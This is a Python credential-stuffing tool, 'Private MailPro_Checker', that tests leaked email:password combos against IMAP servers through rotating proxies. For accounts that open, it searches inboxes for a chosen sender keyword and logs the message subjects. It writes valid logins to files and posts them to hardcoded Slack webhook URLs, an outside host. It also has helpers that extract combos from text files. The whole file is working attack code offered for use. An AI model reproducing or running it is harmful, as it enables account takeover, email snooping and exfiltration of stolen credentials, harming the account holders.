import json
import pathlib
import platform
import re
import socket
from imaplib import IMAP4 as imap
from imaplib import IMAP4_SSL as ssl_imap
from multiprocessing.dummy import Pool
from os.path import exists, isfile
from random import choice
from tkinter.filedialog import askopenfilename
import os
import requests
import socks
from colorama import Fore
from colorama import Fore as fn, init
from colorama import Style as s
from colorama import Style
import email
from email.header import decode_header

# --------Global Variables----------
init(convert=True)
# get current directory
directory = pathlib.Path().resolve()
serverData = []
proxy_name = ""
bad = 0
good = 0
loaded = 0
errors = 0
proxies = 0
checked = 0
free = 0
i = 0
keyword = ""
day = int('01')
month = 'Jan'
year = 2000
use_proxy = ""


def proxy_http():
    global i
    i += 1
    if i == 5000 and proxy_name == 'MazHttp.txt':
        while True:
            try:
                url = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5250&country=all&ssl=yes&anonymity=all&simplified=true'
                maz = requests.get(url)
                if maz.status_code == 200:
                    open('MazHttp.txt', 'wb').write(maz.content)
                    i = 0
                    break
                else:
                    i = 0
                    break
            except:
                continue

    prox = open(proxy_name, "r").readlines()
    cleaned_prox = [items.rstrip() for items in prox]
    random_proxy = choice(cleaned_prox)
    return random_proxy


def compare(combo_name):
    with open(combo_name, 'r', errors='ignore') as c:
        d = set(c.readlines())

    with open(f"Invalid_account.txt", 'r', errors='ignore') as i:
        e = set(i.readlines())

    open(f'combo_unprocessed.txt', 'w').close()  # Create the file

    with open(f'combo_unprocessed.txt', 'a') as f:
        for line in list(d - e):
            f.write(line)
    f.close()
    print('Finished checking')
    input('Press enter to exit')
    c.close()
    i.close()
    exit()


def initScript(combo_name, threads):
    global serverData, loaded

    with open('maztech.dat', encoding='utf-8', errors='ignore') as d:
        serverData = d.readlines()

    with open(combo_name, encoding='utf-8', errors='ignore') as c:
        combo = c.readlines()
        for line in combo:
            if line != "\n":
                loaded += 1

    pool = Pool(threads)
    try:
        for _ in pool.imap_unordered(check, combo):
            pass
    except KeyboardInterrupt:
        print(Fore.LIGHTMAGENTA_EX)
        print("Dont Close ! Wait moment to save unprocessed combo")
        print("Dont Close ! Wait moment to save unprocessed combo")
        print("Dont Close ! Wait moment to save unprocessed combo")
        print("Dont Close ! Wait moment to save unprocessed combo")
        pool.terminate()
    
    pool.join()
    pool.close()
    c.close()
    d.close()
    compare(combo_name)
    print("end")


def check(emailPass):
    global checked, loaded, bad, errors, good, free, use_proxy, sujet
    if platform.system() == 'Linux':
        print(f' Checked: {checked}/{loaded} Bad: {bad}  Error: {errors} Good: {good} Free: {free}', end='', flush=True)
    else:
        from ctypes import windll
        windll.kernel32.SetConsoleTitleW(
            f" Checked: {checked}/{loaded} Bad: {bad}  Error: {errors} Good: {good} Free: {free} ")

    mail_user = ""
    try:
        mail_user = re.search('^.{1,64}@', emailPass).group(0)
        mail_domain = re.search('@.{1,255}:', emailPass).group(0)
        password = re.search(':.{1,}\n', emailPass).group(0)
        mail_domain = mail_domain[1:-1]
        password = password[1:-1]
        checked += 1
    except:
        errors += 1
        print(Fore.LIGHTMAGENTA_EX)
        print("Invalid Combo")
        print(Style.RESET_ALL)
        f = open('Invalid_combo.txt', 'a')
        f.write(f'{mail_user}\n')
        f.close()
        return 'invalid_combo'

    if 'gmail.' in mail_domain or 'googlemail.com' in mail_domain \
            or 'yahoo.' in mail_domain or 'google.com' in mail_domain or '':
        bad += 1
        print(Fore.LIGHTMAGENTA_EX)
        print(f'{mail_domain} is very secure mail, contact me if you have a paid proxies for private checker')
        print(Style.RESET_ALL)
        return "secure_domain"

    while True:
        if use_proxy == 1:
            proxx = proxy_http()
            proxy_ip = re.search('^.{1,255}:', proxx).group(0)
            port = re.search(':.{1,}', proxx).group(0)
            proxy_ip = proxy_ip[:-1]
            port = port[1:]
            port = int(port)

            socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, proxy_ip, port, True)
            socket.socket = socks.socksocket

        try:
            socket.create_connection(('ramziv.com', 80), timeout=5)
            i = 0
            for line in serverData:
                if mail_domain in line:
                    i += 1
                    server = re.search(':[a-zA-Z0-9.-]{1,255}:', line).group(0)
                    server = server[1:-1]
                    try:
                        mail = ssl_imap(server)
                    except:
                        try:
                            print(Fore.LIGHTMAGENTA_EX)
                            print("ssl_imap failed trying with imap")
                            print(Style.RESET_ALL)
                            mail = imap(server)
                        except:
                            errors += 1
                            print(Fore.LIGHTMAGENTA_EX)
                            print("imap failed")
                            print(Style.RESET_ALL)
                            f = open('Invalid_imap.txt', 'a')
                            f.write(f' imap failed "{server}" for: {mail_user}{mail_domain}:{password}\n')
                            f.close()
                            continue
                    try:
                        if (mail):
                            mail.login(mail_user + mail_domain, password)
                            print(Fore.LIGHTGREEN_EX)
                            print(f' logged in "{server}" for: {mail_user}{mail_domain}:{password}\n')
                            print(Style.RESET_ALL)

                            if keyword:
                                mail.select('INBOX')
                                status, results = mail.search(None, f'(HEADER FROM "{keyword}")',
                                                              f'(SINCE "{day}-{month}-{year}")')
                                if status == 'OK':
                                    if results[0]:
                                        j = 0
                                        good += 1
                                        print(f' keyword "{keyword}" fond for: {mail_user}{mail_domain}:{password}\n')
                                        f = open('Found.txt', 'a')
                                        f.write(
                                            f'\n#########################{mail_user}{mail_domain}:{password}#########################\n'
                                            f'#from: {keyword}                                   Since:{day}-{month}-{year}'
                                            f'#\n'
                                            f'#---------------------------     Subjects --------------------------------------#\n')
                                        for mid in results[0].split():
                                            typ, data = mail.fetch(mid, '(RFC822)')
                                            for response in data:
                                                if isinstance(response, tuple):
                                                    # parse a bytes email into a message object
                                                    msg = email.message_from_bytes(response[1])
                                                    # decode the email subject
                                                    subject, encoding = decode_header(msg["Subject"])[0]
                                                    if isinstance(subject, bytes):
                                                        # if it's a bytes, decode to str
                                                        subject = subject.decode(encoding)
                                                    j += 1
                                                    sujet = f"Subject[{j}]: {subject}"

                                            f.write(f"#-{sujet}\n")
                                        f.write(
                                            "*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*By Aqvayli*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*"
                                            "\n")
                                        f.close()
                                        hook = {
                                            'text': f"keyword '{keyword}' fond for: {mail_user}{mail_domain}:{password}\n"
                                                    f"#{sujet}\n-------------------------------\n"}
                                        hack = requests.session()
                                        json_con = hack.post(
                                            "https://hooks.slack.com/services/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",
                                            data=json.dumps(hook))

                                        break

                                    else:
                                        v = open('free.txt', 'a')
                                        v.write(f' logged in "{server}" for: {mail_user}{mail_domain}:{password}\n')
                                        v.close()
                                        free += 1
                                        hook = {'text': f"FREE: {mail_user}{mail_domain}:{password}"}
                                        hack = requests.session()
                                        json_con = hack.post(
                                            "https://hooks.slack.com/services/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",
                                            data=json.dumps(hook))

                                        break

                            else:
                                v = open('free.txt', 'a')
                                v.write(f' logged in "{server}" for: {mail_user}{mail_domain}:{password}\n')
                                v.close()
                                free += 1
                                hook = {'text': f"Free: {mail_user}{mail_domain}:{password}"}
                                hack = requests.session()
                                json_con = hack.post(
                                    "https://hooks.slack.com/services/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",
                                    data=json.dumps(hook))

                                break


                    except Exception as e:
                        if "Invalid login" in str(e) or "LOGIN failed" in str(e) or "LOGIN Invalid credentials" in str(
                                e) or "authentication failed" in str(e) or "Invalid credentials" in str(e) \
                                or "Invalid user name or password" in str(e) or "Incorrect authentication data" in str(
                            e) \
                                or "Authentication failed" in str(e) or "Authentication Failed" in str(e):
                            print(Fore.LIGHTRED_EX)
                            print(f' invalid login "{server}" for: {mail_user}{mail_domain}:{password}\n')
                            print(Style.RESET_ALL)
                            inv = open('Invalid_account.txt', 'a')
                            inv.write(f'{mail_user}{mail_domain}:{password}\n')
                            inv.close()
                            if i < 2:
                                bad += 1

                        else:
                            print(str(e))
                            if i < 2:
                                bad += 1
                            print(Fore.LIGHTYELLOW_EX)
                            print(f' {e} error hostname "{server}" for: {mail_user}{mail_domain}:{password}\n')
                            print(Style.RESET_ALL)
                            err = open('invalid_hostname.txt', 'a')
                            err.write(
                                f' error hostname "{server}" for: {mail_user}{mail_domain}:{password}\n {str(e)} \n')
                            err.close()
                            continue

                else:
                    continue
            break
        except socket.timeout:
            print("timeout error")
            errors += 1
            continue
        except:
            errors += 1
            continue
    return "end"


# ----------------------------------------------activate functions-----------------------------------------------------------
def mail_access():
    try:
        print(Style.RESET_ALL)
        print(Fore.LIGHTBLUE_EX)
        print("Combo Name: ")
        combo_name = askopenfilename()
        print('-------------------------------------')
        print(Style.RESET_ALL)
        if not exists(combo_name):
            print(Fore.CYAN)
            print("\t \t \t The combo don't exist")
            print(Style.RESET_ALL)
            exit(1)
        if not isfile(combo_name):
            print(Fore.CYAN)
            print("\t \t \t The combo isn't a file")
            print(Style.RESET_ALL)
            exit(1)
        # Chose to use proxies or not
        print(Fore.YELLOW)
        print("-------------------------------------")
        print("- Use Proxies (1)")
        print("- Don't use Proxies (2)")
        print(Style.RESET_ALL)
        while True:
            try:
                print(Fore.BLUE)
                use_proxy = int(input("My choise is: "))
                print(Style.RESET_ALL)
                if use_proxy == 1 or use_proxy == 2:
                    break
                else:
                    print(Fore.LIGHTCYAN_EX)
                    print("please select 1 or 2")
                    print(Style.RESET_ALL)
            except:
                print("Wrong input, option 2 selected by default")
                use_proxy = 2
                break

        # chose what type proxies to use
        if use_proxy == 1:
            print(Fore.LIGHTGREEN_EX)
            print("-------------------------------------")
            print("- Scrap proxies online updating every 5 minutes (1)")
            print("- I want Upload My own Proxy-list               (2)")
            print(Style.RESET_ALL)
            while True:
                try:
                    print(Fore.LIGHTRED_EX)
                    location_proxy = int(input("My choice is: "))
                    print(Style.RESET_ALL)
                    if (location_proxy == 1 or location_proxy == 2):
                        break
                    else:
                        print(Fore.LIGHTCYAN_EX)
                        print("please select 1 or 2")
                        print(Style.RESET_ALL)
                except:
                    print("Wrong input, option 1 selected by default")
                    location_proxy = 1
                    break
            # Get proxies online
            print(Style.RESET_ALL)
            print(Fore.LIGHTYELLOW_EX)
            print("-------------------------------------")
            if location_proxy == 1:
                while True:
                    try:
                        url = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5250&country=all&ssl=yes&anonymity=all&simplified=true'
                        maz = requests.get(url)
                        if maz.status_code == 200:
                            open('MazHttp.txt', 'wb').write(maz.content)
                            proxy_name = 'MazHttp.txt'
                            break
                        else:
                            continue
                    except:
                        continue
            # Get proxies locally
            elif location_proxy == 2:
                print("Proxy-list Name: ")
                proxy_name = askopenfilename()
                if not exists(proxy_name):
                    print(Fore.CYAN)
                    print("\t \t \t The proxy don't exist")
                    print(Style.RESET_ALL)
                    exit(1)
                if not isfile(proxy_name):
                    print(Fore.CYAN)
                    print("\t \t \t The proxy isn't a file")
                    print(Style.RESET_ALL)
                    exit(1)
        # Input for searching keywords and DATE
        print(Style.RESET_ALL)
        print(Fore.LIGHTMAGENTA_EX)
        keyword = input('Enter the text to search for in bodies: ')
        try:
            while True:
                day = int(input('Enter search start day 2digit (ex : 01, 02, 30 ..etc): '))
                if 0 < day < 31:
                    break
                else:
                    print("Wrong input, day 01 is default day")
                    day = int('01')
                    break
            while True:
                month = input('enter search start month (ex:Jan, Feb, Mar, Apr, May, Jun, Jul, Aug, Sep, Oct, Nov, '
                              'Dec): ')
                if month == "Jan" or month == "Feb" or month == "Mar" or month == "Apr" or month == "May" or month == "Jun" \
                        or month == "Jul" or month == "Aug" or month == "Sep" or month == "Oct" or month == "Nov" or month == "Dec":
                    break
                else:
                    print("Wrong input, month Jan is default month")
                    month = 'Jan'
                    break
            while True:
                year = int(input('enter search start year (ex: 2022): '))
                if year > 2000:
                    break
                else:
                    print("Wrong input, year 2022 is default year")
                    year = int('2022')
                    break
        except:
            print("Wrong input, day 01 is default day")
            day = int('01')
            print("Wrong input, month Jan is default month")
            month = 'Jan'
            print("Wrong input, year 2022 is default year")
            year = int('2022')
        # how many threads
        print(Style.RESET_ALL)
        while True:
            print(Fore.LIGHTRED_EX)
            try:
                threads = int(input("number of threads: "))
                print(Style.RESET_ALL)
                if threads > 0:
                    print("")
                   
                    
                    break
                else:
                    print(Fore.LIGHTCYAN_EX)
                    print("put a valid threads number")
                    print(Style.RESET_ALL)
                    continue
            except:
                continue
        # Init all given inputs
        initScript(combo_name, threads)
    except Exception as e:
        print(str(e))


def combo_extractor():
    try:
        emails = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9.-]+:[a-zA-Z0-9._-]+')
        extracted_combo = open("extracted_Combos.txt", 'w')
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith('.txt') and file not in 'extracted_Combos.txt':
                    print(f'{fn.LIGHTRED_EX}{file} fond {s.RESET_ALL}')
                    combo = open(file, 'r', encoding='utf-8', errors='ignore')
                    combo = emails.findall(combo.read())
                    print(f" Reading file {fn.BLUE} '{file}'{s.RESET_ALL}")
                    len_of_combo = len(combo)
                    if len_of_combo > 1:
                        for i in range(len_of_combo):
                            extracted_combo.write(str(combo[i]))
                            extracted_combo.write("\n")
                        print(f"{fn.GREEN}End of the extraction process for '{file}' file {s.RESET_ALL}\n")

        print(f"{fn.LIGHTYELLOW_EX}[+]*********EXTRACTING Email:PASS DONE***********[+] {s.RESET_ALL} \n")
        print(
            f" {fn.CYAN}[+]*********CHECK extracted_combos.txt FILE FOR EMAIL:PASS COMBOS*************[+] {s.RESET_ALL} \n WAIT... \n")
    except Exception as e:
        print(str(e))


def domains_extractor():
    try:
        print(Fore.LIGHTBLUE_EX)
        print("File Name: ")
        file_name = askopenfilename()
        print('-------------------------------------')
        print(Style.RESET_ALL)
        if not exists(file_name):
            print(Fore.CYAN)
            print("\t \t \t The file don't exist")
            print(Style.RESET_ALL)
            exit(1)
        if not isfile(file_name):
            print(Fore.CYAN)
            print("\t \t \t The file isn't a file")
            print(Style.RESET_ALL)
            exit(1)

        with open(file_name, encoding='utf-8', errors='ignore') as f:
            extracted_emails = f.readlines()

        while True:
            try:
                number_of_domains = int(input(f"enter how many domains you want to extract: "))
                break
            except:
                print("WWWWWWWWWWWWROOOOOOOOOONGGGGGGGGGGGGGGG input TRY AGAAAAAAAAAAAINN")
                number_of_domains = 1
                continue
        domain_list = []
        if number_of_domains:
            while len(domain_list) < number_of_domains:
                print(f"{fn.LIGHTYELLOW_EX}enter {len(domain_list) + 1} domain name to extract combo: {s.RESET_ALL}",
                      end='')
                domain_name = input()
                domain_list.append(domain_name)
            print("\n")
            for i in range(number_of_domains):
                extracted_domain = open(f"{domain_list[i]}.txt", 'a', encoding='utf-8', errors='ignore')
                print(f" {fn.LIGHTRED_EX}'{domain_list[i]}' file Created {s.RESET_ALL}\n")
                print(f" {fn.LIGHTMAGENTA_EX} Searching for {domain_list[i]} {s.RESET_ALL}\n")

                for line in extracted_emails:
                    mail_domain = re.search('@.{1,255}:', line).group(0)
                    mail_domain = mail_domain[1:-1]

                    if domain_list[i] in mail_domain:
                        extracted_domain.write(str(line))
                print(f"Done for {domain_list[i]}\n")
            print(f"{fn.GREEN}[+]*********EXTRACTING Domains DONE***********[+] {s.RESET_ALL}\n")
            print(
                f" {fn.LIGHTCYAN_EX}[+]*********CHECK your parent folder FOR EMAIL:PASS Domains*************[+] {s.RESET_ALL}\n")

        print(f"{fn.GREEN} SCRIPT {s.RESET_ALL} {fn.BLUE}By {s.RESET_ALL} {fn.RED} Aqvayli {s.RESET_ALL} \n WAIT...")
    except Exception as e:
        print(str(e))


def delete_repeated_lines():
    try:
        print(Fore.LIGHTBLUE_EX)
        print("File Name: ")
        file_name = askopenfilename()
        print('-------------------------------------')
        print(Style.RESET_ALL)
        if not exists(file_name):
            print(Fore.CYAN)
            print("\t \t \t The file don't exist")
            print(Style.RESET_ALL)
            exit(1)
        if not isfile(file_name):
            print(Fore.CYAN)
            print("\t \t \t The file isn't a file")
            print(Style.RESET_ALL)
            exit(1)

        # reading the input file
        inputFile = open(file_name, "r", encoding='utf-8', errors='ignore')

        # creating the output file
        outputFile = open(f"{file_name}_clean.txt", "w")

        # holds lines already seen
        lines_seen_so_far = set()

        # iterating each line in the file
        for line in inputFile:

            # checking if line is unique
            if line not in lines_seen_so_far:
                # write unique lines in output file
                outputFile.write(line)

                # adds unique lines to lines_seen_so_far
                lines_seen_so_far.add(line)

            # closing the file
        inputFile.close()
        outputFile.close()
        print(f"Check the output file {file_name}_clean.txt")
    except Exception as e:
        print(str(e))


def delete_lines():
    global first, last
    try:
        print(Fore.LIGHTBLUE_EX)
        print("File Name: ")
        file_name = askopenfilename()
        print('-------------------------------------')
        print(Style.RESET_ALL)
        if not exists(file_name):
            print(Fore.CYAN)
            print("\t \t \t The file don't exist")
            print(Style.RESET_ALL)
            exit(1)
        if not isfile(file_name):
            print(Fore.CYAN)
            print("\t \t \t The file isn't a file")
            print(Style.RESET_ALL)
            exit(1)

        print("[01] Delete from first line to given line")
        print("[02] Delete from given line to last line")
        print("[03] Keep from given line to a given line")
        while True:
            try:
                choix = int(input("chose option number: "))
                if choix == 1 or choix == 2:
                    while True:
                        try:
                            first = int(input("enter line number : "))
                            break
                        except:
                            input("Wrong input try again")
                            first = 5
                            continue
                elif choix == 3:
                    while True:
                        try:
                            first = int(input("enter line number to start from: "))
                            last = int(input("enter line number to end in: "))
                            break
                        except:
                            input("Wrong input try again")
                            first = 5
                            last = 6
                            continue

                else:
                    print("Wrong input try again")
                    continue
                break
            except:
                print("Wrong input try again")
                choix = 1

                continue

        lines = []
        # read file
        with open(file_name, "r", encoding='utf-8', errors='ignore') as fp:
            # read an store all lines into list
            lines = fp.readlines()

        # Write file
        with open(f'{file_name}_resized.txt', 'w') as fp:
            # iterate each line
            for number, line in enumerate(lines):
                # delete line 5 and 8. or pass any Nth line you want to remove
                # note list index starts from 0
                if choix == 1:
                    if number >= first:
                        fp.write(line)
                elif choix == 2:
                    if number <= first:
                        fp.write(line)
                elif choix == 3:
                    if first <= number <= last:
                        fp.write(line)
        print(f"Check the output file {file_name}_resized.txt")
    except Exception as e:
        print(str(e))


# ----------------------------------main---------------------------------------------------------------------------
if __name__ == "__main__":
    print(Fore.LIGHTGREEN_EX + """                                             
    /\         /\        /\         /\--------/       |     -----------  *     *
   /  \       /  \      /  \       /  \      /        |     |            *     *
  /    \     /    \    /    \     /    \    /         |     |    *****|  *+++++*
 /------\   /      \  /      \   /------\  /          |     |     |   |  *     *
/        \ /        \/        \ /        \/---------  |     |---------   *     *    
   """)
    print(Fore.LIGHTCYAN_EX + "\t \t Private MailPro_Checker By herroug -")
    print("")
    print("Please enter Key: ")
    while True:
        _key = input("Key: ")
        if _key == "voumga":
            print(Style.RESET_ALL)
            print("[01] Mail-access")
            print("[02] Combos extractor (all txt files in current directory)")
            print("[03] Domains extractor")
            print("[04] Delete Repeated lines")
            print("[05] delete lines from-to")
            while True:
                try:
                    choix = int(input("chose option number: "))
                    if choix == 1:
                        mail_access()
                        break
                    elif choix == 2:
                        combo_extractor()
                        break
                    elif choix == 3:
                        domains_extractor()
                        break
                    elif choix == 4:
                        delete_repeated_lines()
                        break
                    elif choix == 5:
                        delete_lines()
                        break
                    else:
                        print("Wrong input try again")
                        continue
                except Exception as e:
                    print(str(e))
                    break
        else:
            print(Fore.LIGHTRED_EX + "Invalid Key.")
            continue

        break
# --------------------------------------------------------------------------------------------------
